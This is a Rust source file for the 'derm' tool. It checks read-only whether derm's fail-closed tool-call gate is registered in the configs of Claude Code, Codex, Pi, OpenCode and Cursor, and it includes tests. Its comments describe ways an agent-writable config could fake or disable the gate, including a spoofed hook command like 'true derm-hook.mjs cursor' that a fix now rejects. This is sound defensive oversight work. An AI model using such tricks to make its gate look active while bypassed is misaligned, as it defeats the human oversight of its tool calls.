//! Whether derm's gate is registered for an agent whose gate is built, read
//! from the agent's own user-level files. Nothing here runs the agent, and
//! nothing here writes. What each check reads, at the version in the
//! agent's preset row (lane J status doc, Research):
//!
//! - Claude Code 2.1.311: `enabledPlugins["derm@derm"]` in
//!   `<config>/settings.json`, where `<config>` is `CLAUDE_CONFIG_DIR` or
//!   `~/.claude`; a plugin with no entry is enabled by default, so the
//!   install record `<plugins>/installed_plugins.json` (`plugins.derm@derm`,
//!   `<plugins>` = `CLAUDE_CODE_PLUGIN_CACHE_DIR` or `<config>/plugins`)
//!   decides then. The entry is read from the project's local file, its
//!   shared file, then the user file, the first that sets it (Mac test w4,
//!   MW4-4); a managed file can still turn it off (`derm doctor` reads it).
//! - Codex 0.163.0: `[plugins."derm@derm"]` in `$CODEX_HOME/config.toml`
//!   (`enabled` missing means true; `[plugins._default] enabled = false`
//!   turns unlisted plugins off), the installed copy
//!   `$CODEX_HOME/plugins/cache/derm/derm/<version>/`, and the two hook trust
//!   records `[hooks.state."derm@derm:hooks/hooks.json:<event>:0:0"]`. Codex
//!   skips an untrusted plugin hook without a word (rules case 70).
//! - Pi 1.4.0: an entry of `packages` in `<agent>/settings.json`
//!   (`PI_CODING_AGENT_DIR` or `~/.pi/agent`), a string or `{source}`;
//!   `pi install /abs/path` stores the path relative to `<agent>`, so each
//!   local entry is resolved from there and its `package.json` read.
//! - OpenCode 1.19.4: `plugin` in `config.json`, `opencode.json` or
//!   `opencode.jsonc` under `$XDG_CONFIG_HOME/opencode` (default
//!   `~/.config/opencode`), each entry a string or `[string, options]`; or a
//!   file in its `plugin/` or `plugins/` folder. A bare name is an npm
//!   package to OpenCode, which fetches `<name>@latest`; `@aetiusgular/derm-opencode-plugin`
//!   is not published, so only a path loads.

use std::path::{Path, PathBuf};

use serde_json::Value;

use super::status::Env;

/// Files read here are config files; anything bigger is not one.
const MAX_FILE: u64 = 1024 * 1024;

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Registered {
    Yes(String),
    /// Registered, with something the user should still do (release
    /// recheck 2, RC9): `derm status` prints its note like a "no"'s.
    YesNote(String),
    No(String),
    Unknown(String),
    NotBuilt,
}

impl Registered {
    pub fn word(&self) -> &'static str {
        match self {
            Registered::Yes(_) | Registered::YesNote(_) => "yes",
            Registered::No(_) => "no",
            Registered::Unknown(_) => "unknown",
            Registered::NotBuilt => "n/a",
        }
    }

    pub fn detail(&self) -> Option<String> {
        match self {
            Registered::Yes(d)
            | Registered::YesNote(d)
            | Registered::No(d)
            | Registered::Unknown(d) => Some(d.clone()),
            Registered::NotBuilt => None,
        }
    }
}

pub fn check(id: &str, env: &Env) -> Registered {
    let Some(home) = env.home.as_deref() else {
        return Registered::Unknown("HOME is not set".into());
    };
    match id {
        "claude-code" => claude(env, home),
        "codex" => codex(env, home),
        "pi" => pi(env, home),
        "opencode" => opencode(env, home),
        "cursor" => cursor(home),
        other => Registered::Unknown(format!("no registration check for {other} yet")),
    }
}

/// Reads a regular file of at most `MAX_FILE` bytes. `Ok(None)` when it
/// does not exist.
fn read(path: &Path) -> Result<Option<String>, String> {
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(format!("{}: {e}", path.display())),
    };
    if !meta.is_file() {
        return Err(format!("{} is not a regular file", path.display()));
    }
    if meta.len() > MAX_FILE {
        return Err(format!("{} is over 1 MiB", path.display()));
    }
    std::fs::read_to_string(path)
        .map(Some)
        .map_err(|e| format!("{}: {e}", path.display()))
}

fn read_json(path: &Path, jsonc: bool) -> Result<Option<Value>, String> {
    let Some(text) = read(path)? else {
        return Ok(None);
    };
    let text = if jsonc { strip_jsonc(&text) } else { text };
    serde_json::from_str(&text)
        .map(Some)
        .map_err(|e| format!("{} does not parse: {e}", path.display()))
}

fn tilde(p: &str, home: &Path) -> PathBuf {
    match p.strip_prefix("~/") {
        Some(rest) => home.join(rest),
        None if p == "~" => home.to_path_buf(),
        None => PathBuf::from(p),
    }
}

fn claude(env: &Env, home: &Path) -> Registered {
    let config = env
        .var("CLAUDE_CONFIG_DIR")
        .map(|d| tilde(d, home))
        .unwrap_or_else(|| home.join(".claude"));
    // `enabledPlugins["derm@derm"]` from the highest file that sets it:
    // the project's local file, then its shared file, then the user's
    // (https://code.claude.com/docs/en/settings.md, read 4 Nov 2026; a local
    // install writes the local file; Mac test w4, MW4-4). Managed settings
    // are `derm doctor`'s. Since 2.1.211 the local file can sit at the
    // repository root when Claude Code starts below it; only the starting
    // folder's is read here.
    let mut files: Vec<PathBuf> = Vec::new();
    if let Some(cwd) = env.cwd.as_deref() {
        files.push(cwd.join(".claude/settings.local.json"));
        files.push(cwd.join(".claude/settings.json"));
    }
    files.push(config.join("settings.json"));
    let mut settings = config.join("settings.json");
    let mut enabled = None;
    for file in files {
        match read_json(&file, false) {
            Ok(Some(v)) => {
                if let Some(e) = v.get("enabledPlugins").and_then(|e| e.get("derm@derm")) {
                    enabled = Some(e.clone());
                    settings = file;
                    break;
                }
            }
            Ok(None) => {}
            Err(e) => return Registered::Unknown(e),
        }
    }
    if enabled == Some(Value::Bool(false)) {
        return Registered::No(format!(
            "derm@derm is turned off in {} (enabledPlugins)",
            settings.display()
        ));
    }
    let plugins = env
        .var("CLAUDE_CODE_PLUGIN_CACHE_DIR")
        .map(|d| tilde(d, home))
        .unwrap_or_else(|| config.join("plugins"));
    let installed = plugins.join("installed_plugins.json");
    let record = match read_json(&installed, false) {
        Ok(v) => v.and_then(|v| v.get("plugins").and_then(|p| p.get("derm@derm")).cloned()),
        Err(e) => return Registered::Unknown(e),
    };
    // Claude Code uses a `project` or `local` install record only when its
    // projectPath is the folder it started in, or that folder by its real
    // path; `user` and `managed` records apply everywhere (2.1.311's binary,
    // function `WO`: `if(e.scope==="user"||e.scope==="managed")return!0;let
    // n=ke();if(e.projectPath===n)return!0;...zM(e.projectPath)===r`, where
    // `ke()` is the session's original working folder; Mac test w2, MW3).
    // A record list with scoped entries and none that applies here is not a
    // registration in this folder.
    if let Some(Value::Array(installs)) = &record {
        let scoped: Vec<&str> = installs
            .iter()
            .filter(|r| {
                matches!(
                    r.get("scope").and_then(Value::as_str),
                    Some("project" | "local")
                )
            })
            .filter_map(|r| r.get("projectPath").and_then(Value::as_str))
            .collect();
        let anywhere = installs.iter().any(|r| {
            matches!(
                r.get("scope").and_then(Value::as_str),
                Some("user" | "managed")
            )
        });
        let here = scoped
            .iter()
            .any(|p| same_folder(Path::new(p), env.cwd.as_deref()));
        if !anywhere && !scoped.is_empty() && !here {
            // The path is read from installed_plugins.json, which an agent can
            // write: quoted and short, so it cannot pass for derm's own advice
            // (release check, fix pass 3 review).
            let mut first: String = scoped[0].chars().take(80).collect();
            if scoped[0].chars().count() > 80 {
                first.push('…');
            }
            return Registered::No(format!(
                "derm@derm is installed for {:?}{} only (project or local scope); Claude Code loads it only when started there, and derm status runs in {}",
                first,
                if scoped.len() > 1 {
                    format!(" and {} other folder(s)", scoped.len() - 1)
                } else {
                    String::new()
                },
                env.cwd
                    .as_deref()
                    .map(|c| c.display().to_string())
                    .unwrap_or_else(|| "an unknown folder".into())
            ));
        }
    }
    match (enabled, record) {
        (Some(Value::Bool(true)), Some(_)) => Registered::Yes(format!(
            "derm@derm installed and on in {}; a project or managed settings file can still turn it off",
            settings.display()
        )),
        (Some(Value::Bool(true)), None) => Registered::No(format!(
            "derm@derm is on in {} but not installed ({} has no derm@derm): claude plugin install derm@derm",
            settings.display(),
            installed.display()
        )),
        (None, Some(_)) => Registered::Yes(format!(
            "derm@derm installed ({}); no enabledPlugins entry, which Claude Code reads as on",
            installed.display()
        )),
        (None, None) => Registered::No(
            "derm@derm is not installed: claude plugin marketplace add aetiusgular/derm (it follows the repository's default branch), then claude plugin install derm@derm".into(),
        ),
        // The value is not printed: settings.json is a file an agent can
        // write (release check, fix pass 3 review).
        (Some(other), _) => Registered::Unknown(format!(
            "enabledPlugins[\"derm@derm\"] in {} is {}, not true or false",
            settings.display(),
            match other {
                Value::Null => "null",
                Value::Bool(_) => "a boolean",
                Value::Number(_) => "a number",
                Value::String(_) => "a string",
                Value::Array(_) => "a list",
                Value::Object(_) => "an object",
            }
        )),
    }
}

/// Cursor's CLI (Mac test w4, 4.3; lane Q's Q7, lane N's N4): derm's gate is
/// two entries in `~/.cursor/hooks.json` (`connect/gates.json`, its
/// `json-array-entry` steps: `preToolUse` and `beforeMCPExecution`, each
/// `failClosed: true`), found by the row's marker `derm-hook.mjs` and the
/// dialect word `cursor` at the end of the command. Other entries (Orca's)
/// are left alone. A project's `.cursor/hooks.json` is not derm's (case 78)
/// and is not read here.
fn cursor(home: &Path) -> Registered {
    let file = home.join(".cursor/hooks.json");
    let v = match read_json(&file, false) {
        Ok(Some(v)) => v,
        Ok(None) => {
            return Registered::No(format!(
                "{} does not exist: derm connect cursor --gate --hook <derm-hooks-native folder> --write",
                file.display()
            ))
        }
        Err(e) => return Registered::Unknown(e),
    };
    for event in ["preToolUse", "beforeMCPExecution"] {
        let ours: Vec<&Value> = v
            .pointer(&format!("/hooks/{event}"))
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter(|e| is_derm_cursor_entry(e))
            .collect();
        if ours.is_empty() {
            return Registered::No(format!(
                "{} has no derm entry under hooks.{event}: derm connect cursor --gate --hook <derm-hooks-native folder> --write",
                file.display()
            ));
        }
        if !ours
            .iter()
            .all(|e| e.get("failClosed") == Some(&Value::Bool(true)))
        {
            return Registered::No(format!(
                "derm's hooks.{event} entry in {} is not failClosed: true, so Cursor lets a call through when the gate crashes or times out; run --gate again",
                file.display()
            ));
        }
    }
    Registered::Yes(format!(
        "derm's preToolUse and beforeMCPExecution entries in {}, failing closed",
        file.display()
    ))
}

/// A `hooks.json` entry `derm connect cursor --gate` wrote:
/// `<node> --no-warnings "<abs>/bin/derm-hook.mjs" cursor`
/// (`connect/gates.json`), where the file is a regular file (not a link)
/// owned by you or root that no one else can write, in a folder whose
/// `package.json` names derm-hooks-native. A command that only named the
/// file counted until fix pass 1's review (FP4-S3), so `derm status` said
/// "yes" for `true derm-hook.mjs cursor`. Held equal to
/// `isDermCursorCommand` in `packages/derm-claude-plugin/src/hook.ts`.
pub fn is_derm_cursor_entry(e: &Value) -> bool {
    e.get("command")
        .and_then(Value::as_str)
        .is_some_and(is_derm_cursor_command)
}

fn is_derm_cursor_command(c: &str) -> bool {
    derm_cursor_command_parts(c).is_some()
}

/// The node and the hook file of a command `derm connect cursor --gate`
/// wrote, when it is one (`is_derm_cursor_entry`): the first word is `node`
/// or an absolute path whose last part starts with `node` and whose real
/// file is a regular file of yours or root's that no one else can write
/// (re-review FP5-R3: any first word passed, so `true --no-warnings
/// "<hook>" cursor` counted); both paths are plain (letters, digits and
/// `._/@+~ -`, as `--hook` and `--node` take them, so no `$`, backtick or
/// `\`); the hook file is a regular file of yours or root's, writable by no
/// one else, in a folder whose `package.json` names derm-hooks-native.
#[cfg(unix)]
pub fn derm_cursor_command_parts(c: &str) -> Option<(String, PathBuf)> {
    use std::os::unix::fs::MetadataExt;
    let c = c.trim_end();
    let rest = c.strip_suffix("\" cursor")?;
    let (node, file) = rest.split_once(" --no-warnings \"")?;
    let plain = |p: &str| {
        !p.is_empty()
            && p.chars()
                .all(|ch| ch.is_ascii_alphanumeric() || "._/@+~-".contains(ch))
            && !p.split('/').any(|part| part == ".." || part == ".")
    };
    if !plain(node) || !plain(file) {
        return None;
    }
    if !file.starts_with('/') || !file.ends_with("/bin/derm-hook.mjs") {
        return None;
    }
    let uid = derm_core::platform::real_user();
    let closed = |m: &std::fs::Metadata| (m.uid() == uid || m.uid() == 0) && m.mode() & 0o022 == 0;
    if node != "node" {
        let name = node.rsplit('/').next().unwrap_or("");
        if !node.starts_with('/') || !name.starts_with("node") {
            return None;
        }
        let real = std::fs::canonicalize(node).ok()?;
        let m = std::fs::metadata(&real).ok()?;
        if !m.is_file() || !closed(&m) {
            return None;
        }
    }
    let file = Path::new(file);
    let m = std::fs::symlink_metadata(file).ok()?;
    if !m.is_file() || !closed(&m) {
        return None;
    }
    let pkg = file.parent()?.parent()?.join("package.json");
    let pm = std::fs::symlink_metadata(&pkg).ok()?;
    if !pm.is_file() || !closed(&pm) || pm.len() > 1024 * 1024 {
        return None;
    }
    let named = std::fs::read_to_string(&pkg)
        .ok()
        .and_then(|t| serde_json::from_str::<Value>(&t).ok())
        .is_some_and(|v| v["name"] == "@aetiusgular/derm-hooks-native");
    named.then(|| (node.to_string(), file.to_path_buf()))
}

/// Windows (lane Z): the command form above is Unix paths only; no Windows
/// form is read yet, so nothing counts as derm's Cursor hook.
#[cfg(not(unix))]
pub fn derm_cursor_command_parts(_c: &str) -> Option<(String, PathBuf)> {
    None
}

/// What derm's registered Cursor gate runs, for srt to keep read-only
/// (re-review FP5-R2): each derm entry's hook package folder and, when it is
/// named by path, its node. Empty when `~/.cursor/hooks.json` is missing,
/// too large or unreadable, or holds no derm entry.
pub fn derm_cursor_gate_paths(home: &Path) -> Vec<String> {
    let file = home.join(".cursor/hooks.json");
    let Ok(Some(v)) = read_json(&file, false) else {
        return Vec::new();
    };
    let mut out: Vec<String> = Vec::new();
    for event in ["preToolUse", "beforeMCPExecution"] {
        for e in v
            .pointer(&format!("/hooks/{event}"))
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
        {
            let Some((node, hook)) = e
                .get("command")
                .and_then(Value::as_str)
                .and_then(derm_cursor_command_parts)
            else {
                continue;
            };
            if let Some(pkg) = hook.parent().and_then(Path::parent) {
                out.push(pkg.to_string_lossy().into_owned());
            }
            if node.starts_with('/') {
                out.push(node);
            }
        }
    }
    out.sort();
    out.dedup();
    out
}

/// Where a `derm@derm` install record in `installed_plugins.json` stands for
/// a Claude Code started in `cwd`: `None` when it does not apply there, else
/// its rank, lower first. `user` and `managed` records (and one with no
/// scope, from an older Claude Code) apply anywhere; `project` and `local`
/// ones only in their `projectPath` (2.1.311's binary, function `WO`, quoted
/// in `claude` below). Which one Claude Code loads when several apply was not
/// read (NF); derm takes local, then project, then the rest, the order of
/// Claude Code's settings files (https://code.claude.com/docs/en/settings.md,
/// read 4 Nov 2026). `derm doctor` uses it (Mac test w4, MW4-4).
pub fn claude_record_rank(record: &Value, cwd: Option<&Path>) -> Option<u8> {
    let here = || {
        record
            .get("projectPath")
            .and_then(Value::as_str)
            .is_some_and(|p| same_folder(Path::new(p), cwd))
    };
    match record.get("scope").and_then(Value::as_str) {
        Some("local") => here().then_some(0),
        Some("project") => here().then_some(1),
        _ => Some(2),
    }
}

/// Whether `recorded` names the folder `cwd`, as written or by real path.
fn same_folder(recorded: &Path, cwd: Option<&Path>) -> bool {
    let Some(cwd) = cwd else {
        return false;
    };
    if recorded == cwd {
        return true;
    }
    match (std::fs::canonicalize(recorded), std::fs::canonicalize(cwd)) {
        (Ok(a), Ok(b)) => a == b,
        _ => false,
    }
}

/// Codex's hook trust keys for derm's plugin (`tests/cli-contract/checks/dermCodex.mjs`).
pub const CODEX_HOOK_KEYS: [&str; 2] = [
    "derm@derm:hooks/hooks.json:pre_tool_use:0:0",
    "derm@derm:hooks/hooks.json:post_tool_use:0:0",
];

/// What `[marketplaces.derm]` in Codex's config.toml is. Codex 0.166.0 writes
/// `source_type = "git"`, `source = "https://github.com/aetiusgular/derm.git"`
/// and `ref` for `codex plugin marketplace add aetiusgular/derm --ref <tag>`,
/// and `source_type = "local"` with the folder for the folder form (both run
/// on the box, release recheck).
#[derive(Debug, PartialEq)]
enum Marketplace {
    Absent,
    /// derm's repository at this release's tag.
    Ours,
    /// derm's repository at another ref, or with none (the default branch).
    OursOtherRef,
    /// A folder on this machine: the documented clone route. derm cannot
    /// tell from config.toml whether the folder holds derm, so a plugin from
    /// it is never reported as registered (release recheck review, H1).
    Local,
    /// Anything else, a value that is not a table included.
    Foreign,
}

fn codex_marketplace(doc: &toml_edit::DocumentMut) -> Marketplace {
    let Some(item) = doc
        .get("marketplaces")
        .and_then(|m| m.as_table_like())
        .and_then(|m| m.get("derm"))
    else {
        return Marketplace::Absent;
    };
    let Some(t) = item.as_table_like() else {
        return Marketplace::Foreign;
    };
    let str_of = |k: &str| t.get(k).and_then(|v| v.as_str());
    match (str_of("source_type"), str_of("source")) {
        (Some("local"), Some(_)) => Marketplace::Local,
        (Some("git"), Some(src)) => {
            let src = src.to_ascii_lowercase();
            let ours = src == "https://github.com/aetiusgular/derm.git"
                || src == "https://github.com/aetiusgular/derm";
            if !ours {
                return Marketplace::Foreign;
            }
            match str_of("ref") {
                Some(r) if r == format!("v{}", env!("CARGO_PKG_VERSION")) => Marketplace::Ours,
                _ => Marketplace::OursOtherRef,
            }
        }
        _ => Marketplace::Foreign,
    }
}

fn codex(env: &Env, home: &Path) -> Registered {
    let codex_home = env
        .var("CODEX_HOME")
        .map(|d| tilde(d, home))
        .unwrap_or_else(|| home.join(".codex"));
    let config = codex_home.join("config.toml");
    let text = match read(&config) {
        Ok(Some(t)) => t,
        Ok(None) => {
            return Registered::No(format!(
            "no {}: codex plugin marketplace add aetiusgular/derm --ref v{}, then codex plugin add derm@derm",
            config.display(),
            env!("CARGO_PKG_VERSION")
        ))
        }
        Err(e) => return Registered::Unknown(e),
    };
    let doc: toml_edit::DocumentMut = match text.parse() {
        Ok(d) => d,
        Err(_) => {
            return Registered::Unknown(format!("{} does not parse as TOML", config.display()))
        }
    };
    let version = env!("CARGO_PKG_VERSION");
    let readd = format!(
        "codex plugin marketplace remove derm, then codex plugin marketplace add aetiusgular/derm --ref v{version}, then codex plugin add derm@derm"
    );
    // A marketplace named `derm` that is not derm's would hand `derm@derm`
    // to whatever it points at, and config.toml is a file an agent can write
    // (release recheck review, medium). Nothing read from it is printed.
    let marketplace = codex_marketplace(&doc);
    if marketplace == Marketplace::Foreign {
        return Registered::No(format!(
            "[marketplaces.derm] in {} is not aetiusgular/derm's repository or a local folder, so its derm@derm is not derm's: {readd}",
            config.display()
        ));
    }
    let plugins = doc.get("plugins").and_then(|p| p.as_table_like());
    let entry = plugins
        .and_then(|p| p.get("derm@derm"))
        .and_then(|e| e.as_table_like());
    let enabled_of = |t: Option<&dyn toml_edit::TableLike>| {
        t.and_then(|t| t.get("enabled")).and_then(|v| v.as_bool())
    };
    let on = match entry {
        Some(e) => enabled_of(Some(e)).unwrap_or(true),
        None => {
            // `codex plugin add derm@derm` fails until the marketplace is
            // configured (release recheck RC7, Codex 0.166.0), so name it first.
            return Registered::No(match marketplace {
                Marketplace::Absent => format!(
                    "{} has no [marketplaces.derm]: codex plugin marketplace add aetiusgular/derm --ref v{version}, then codex plugin add derm@derm",
                    config.display()
                ),
                Marketplace::OursOtherRef => format!(
                    "[marketplaces.derm] in {} is pinned to another release than v{version}: {readd}",
                    config.display()
                ),
                Marketplace::Local => format!(
                    "{} has no [plugins.\"derm@derm\"]: codex plugin add derm@derm (its marketplace is a local folder, which derm cannot check)",
                    config.display()
                ),
                _ => format!(
                    "{} has no [plugins.\"derm@derm\"]: codex plugin add derm@derm",
                    config.display()
                ),
            });
        }
    };
    if !on {
        return Registered::No(format!("derm@derm is turned off in {}", config.display()));
    }
    let cache = codex_home.join("plugins/cache/derm/derm");
    let installed = std::fs::read_dir(&cache)
        .map(|rd| rd.flatten().any(|e| e.path().is_dir()))
        .unwrap_or(false);
    if !installed {
        return Registered::No(format!(
            "derm@derm is listed but no copy is in {}; Codex reports it as not installed",
            cache.display()
        ));
    }
    let hooks = doc
        .get("hooks")
        .and_then(|h| h.as_table_like())
        .and_then(|h| h.get("state"))
        .and_then(|s| s.as_table_like());
    let trusted: Vec<&str> = CODEX_HOOK_KEYS
        .iter()
        .copied()
        .filter(|k| {
            hooks
                .and_then(|s| s.get(k))
                .and_then(|t| t.as_table_like())
                .and_then(|t| t.get("trusted_hash"))
                .and_then(|v| v.as_str())
                .is_some_and(|h| h.starts_with("sha256:"))
        })
        .collect();
    if trusted.len() < CODEX_HOOK_KEYS.len() {
        return Registered::No(format!(
            "derm@derm is installed but {} of its 2 hooks have a trust record; Codex skips an untrusted hook without a word: trust them in /hooks",
            trusted.len()
        ));
    }
    let done = format!(
        "derm@derm installed, on and both hooks trusted in {}; whether each trusted hash still matches hooks.json is not checked here (Codex re-asks when it changes)",
        config.display()
    );
    match marketplace {
        Marketplace::Local => Registered::Unknown(format!(
            "{done}; but its marketplace is a local folder, and derm cannot check that the folder holds derm"
        )),
        Marketplace::OursOtherRef => Registered::YesNote(format!(
            "{done}; its marketplace is pinned to another release than v{version}: {readd}"
        )),
        _ => Registered::Yes(done),
    }
}

fn pi(env: &Env, home: &Path) -> Registered {
    let agent = env
        .var("PI_CODING_AGENT_DIR")
        .map(|d| tilde(d, home))
        .unwrap_or_else(|| home.join(".pi/agent"));
    let settings = agent.join("settings.json");
    let v = match read_json(&settings, false) {
        Ok(Some(v)) => v,
        Ok(None) => {
            return Registered::No(format!(
                "no {}: pi install <folder>/packages/derm-pi, from the release's source archive or a clone (docs/install/agents.md)",
                settings.display()
            ))
        }
        Err(e) => return Registered::Unknown(e),
    };
    let entries = v
        .get("packages")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    for e in &entries {
        let source = match e {
            Value::String(s) => s.as_str(),
            Value::Object(o) => o.get("source").and_then(Value::as_str).unwrap_or(""),
            _ => "",
        };
        if source == "npm:@aetiusgular/derm-pi" || source.starts_with("npm:@aetiusgular/derm-pi@") {
            return Registered::Yes(format!("{source} in {}", settings.display()));
        }
        if source.contains(':') && !source.starts_with('/') {
            continue; // git:, npm: of another package, a URL
        }
        let path = if Path::new(source).is_absolute() {
            PathBuf::from(source)
        } else {
            agent.join(tilde(source, home))
        };
        let name = read_json(&path.join("package.json"), false)
            .ok()
            .flatten()
            .and_then(|p| p.get("name").and_then(Value::as_str).map(str::to_string));
        if name.as_deref() == Some("@aetiusgular/derm-pi") {
            return Registered::Yes(format!(
                "{} (from {}) in {}",
                path.display(),
                source,
                settings.display()
            ));
        }
    }
    Registered::No(format!(
        "no derm-pi in packages of {}: pi install <folder>/packages/derm-pi, from the release's source archive or a clone (docs/install/agents.md)",
        settings.display()
    ))
}

fn opencode(env: &Env, home: &Path) -> Registered {
    let base = env
        .var("XDG_CONFIG_HOME")
        .map(|d| tilde(d, home))
        .unwrap_or_else(|| home.join(".config"))
        .join("opencode");
    let mut bare = None;
    for (file, jsonc) in [
        ("config.json", false),
        ("opencode.json", true),
        ("opencode.jsonc", true),
    ] {
        let path = base.join(file);
        let v = match read_json(&path, jsonc) {
            Ok(Some(v)) => v,
            Ok(None) => continue,
            Err(e) => return Registered::Unknown(e),
        };
        for e in v
            .get("plugin")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default()
        {
            let spec = match &e {
                Value::String(s) => s.clone(),
                Value::Array(a) => a.first().and_then(Value::as_str).unwrap_or("").to_string(),
                _ => continue,
            };
            let local = spec.starts_with('/')
                || spec.starts_with("./")
                || spec.starts_with("file://")
                || spec.starts_with("~/");
            if local {
                let p = spec.strip_prefix("file://").unwrap_or(&spec);
                let p = if p.starts_with("./") {
                    base.join(p)
                } else {
                    tilde(p, home)
                };
                if p.to_string_lossy().contains("derm-opencode-plugin") {
                    return Registered::Yes(format!("{} in {}", p.display(), path.display()));
                }
            } else if spec == "@aetiusgular/derm-opencode-plugin"
                || spec.starts_with("@aetiusgular/derm-opencode-plugin@")
            {
                bare = Some(path.clone());
            }
        }
    }
    for dir in ["plugin", "plugins"] {
        if let Ok(rd) = std::fs::read_dir(base.join(dir)) {
            for e in rd.flatten() {
                let n = e.file_name().to_string_lossy().to_string();
                if n.starts_with("derm") && (n.ends_with(".ts") || n.ends_with(".js")) {
                    return Registered::Yes(format!("{} (plugin folder)", e.path().display()));
                }
            }
        }
    }
    match bare {
        Some(p) => Registered::No(format!(
            "{} names @aetiusgular/derm-opencode-plugin by npm name; OpenCode fetches it from npm, where it is not published, so it does not load: name the folder's path instead",
            p.display()
        )),
        None => Registered::No(format!(
            "no derm plugin in {}: add the plugin's path to `plugin` (opencode.fragment.json)",
            base.display()
        )),
    }
}

/// JSONC to JSON: drops `//` and `/* */` comments outside strings, then a
/// comma before `}` or `]`.
pub fn strip_jsonc(text: &str) -> String {
    let no_comments = scan(text, |b, i, out| {
        if b[i] == '/' && b.get(i + 1) == Some(&'/') {
            let mut j = i;
            while j < b.len() && b[j] != '\n' {
                j += 1;
            }
            return Some(j);
        }
        if b[i] == '/' && b.get(i + 1) == Some(&'*') {
            let mut j = i + 2;
            while j + 1 < b.len() && !(b[j] == '*' && b[j + 1] == '/') {
                j += 1;
            }
            out.push(' ');
            return Some((j + 2).min(b.len()));
        }
        None
    });
    scan(&no_comments, |b, i, _| {
        if b[i] != ',' {
            return None;
        }
        let mut j = i + 1;
        while j < b.len() && b[j].is_whitespace() {
            j += 1;
        }
        matches!(b.get(j), Some('}') | Some(']')).then_some(i + 1)
    })
}

/// Copies `text`, leaving strings alone; outside strings `skip` may consume
/// from `i` (returning where to go on) or decline (`None`).
fn scan(text: &str, mut skip: impl FnMut(&[char], usize, &mut String) -> Option<usize>) -> String {
    let b: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    let mut in_str = false;
    while i < b.len() {
        let c = b[i];
        if in_str {
            out.push(c);
            if c == '\\' && i + 1 < b.len() {
                out.push(b[i + 1]);
                i += 2;
                continue;
            }
            in_str = c != '"';
            i += 1;
        } else if c == '"' {
            in_str = true;
            out.push(c);
            i += 1;
        } else if let Some(next) = skip(&b, i, &mut out) {
            i = next;
        } else {
            out.push(c);
            i += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Home(PathBuf);
    impl Drop for Home {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn home(name: &str) -> (Home, Env) {
        let dir = std::env::temp_dir().join(format!("derm-reg-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let env = Env {
            home: Some(dir.clone()),
            path: String::new(),
            vars: Vec::new(),
            cwd: None,
        };
        (Home(dir), env)
    }

    fn put(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    /// Release check RC4: a release user has no clone. The hints name the
    /// published repository where the agent takes it as a marketplace, and
    /// the install page for Pi, which takes a folder.
    #[test]
    fn the_install_hints_work_without_a_clone() {
        let (h, env) = home("hints");
        let claude = check("claude-code", &env).detail().unwrap();
        assert!(
            claude.contains("claude plugin marketplace add aetiusgular/derm"),
            "{claude}"
        );
        let codex = check("codex", &env).detail().unwrap();
        // Fix pass review F5: pinned to this release's tag, not the branch.
        let pinned = format!(
            "codex plugin marketplace add aetiusgular/derm --ref v{}",
            env!("CARGO_PKG_VERSION")
        );
        assert!(codex.contains(&pinned), "{codex}");
        assert!(claude.contains("default branch"), "{claude}");
        let pi = check("pi", &env).detail().unwrap();
        put(&h.0.join(".pi/agent/settings.json"), r#"{"packages":[]}"#);
        let pi_listed = check("pi", &env).detail().unwrap();
        for hint in [&claude, &codex, &pi, &pi_listed] {
            assert!(!hint.contains("<derm clone>"), "{hint}");
            assert!(!hint.contains("/abs/path/to/derm"), "{hint}");
        }
        for hint in [&pi, &pi_listed] {
            assert!(hint.contains("docs/install/agents.md"), "{hint}");
        }
    }

    /// Release recheck RC7: every Codex user has a config.toml. Without derm's
    /// marketplace in it, `codex plugin add derm@derm` fails ("plugin `derm`
    /// was not found in marketplace `derm`", Codex 0.166.0 on the box), so the
    /// hint names the marketplace first; once the marketplace is there, only
    /// the plugin line.
    #[test]
    fn the_codex_hint_names_the_marketplace_until_codex_has_it() {
        let (h, env) = home("rc7");
        let cfg = h.0.join(".codex/config.toml");
        let v = env!("CARGO_PKG_VERSION");
        let pinned = format!("codex plugin marketplace add aetiusgular/derm --ref v{v}");
        let hint = |text: &str| {
            put(&cfg, text);
            check("codex", &env)
        };
        let plugin_only = |r: Registered| {
            let d = r.detail().unwrap().to_string();
            assert_eq!(r.word(), "no", "{d}");
            assert!(!d.contains("marketplace add"), "{d}");
            assert!(d.contains("codex plugin add derm@derm"), "{d}");
        };
        // Another plugin's marketplace only: name derm's first.
        let r = hint("[marketplaces.openai-bundled]\nsource = \"x\"\n\n[plugins.\"pdf@openai-bundled\"]\nenabled = true\n");
        let d = r.detail().unwrap();
        assert!(
            d.contains(&pinned) && d.contains("then codex plugin add derm@derm"),
            "{d}"
        );
        // derm's at this release, in each TOML spelling, with or without a ref,
        // in any letter case: the plugin line alone.
        let git = "source_type = \"git\", source = \"https://github.com/aetiusgular/derm.git\"";
        plugin_only(hint(&format!("[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://github.com/aetiusgular/derm.git\"\nref = \"v{v}\"\n")));
        plugin_only(hint(&format!(
            "[marketplaces]\nderm = {{ {git}, ref = \"v{v}\" }}\n"
        )));
        plugin_only(hint(&format!("marketplaces.derm.source_type = \"git\"\nmarketplaces.derm.source = \"https://github.com/aetiusgular/derm\"\nmarketplaces.derm.ref = \"v{v}\"\n")));
        plugin_only(hint(&format!("[marketplaces.derm]\nsource_type = \"git\"\nsource = \"https://GitHub.com/AetiusGular/derm.git\"\nref = \"v{v}\"\n")));
        // The folder form, as Codex 0.166.0 wrote it on the box.
        plugin_only(hint(
            "[marketplaces.derm]\nsource_type = \"local\"\nsource = \"/home/u/derm-0.1.1\"\n",
        ));
        // derm's at another tag (what Codex wrote on the box for --ref v0.1.1,
        // read by a later version): remove and add at this release.
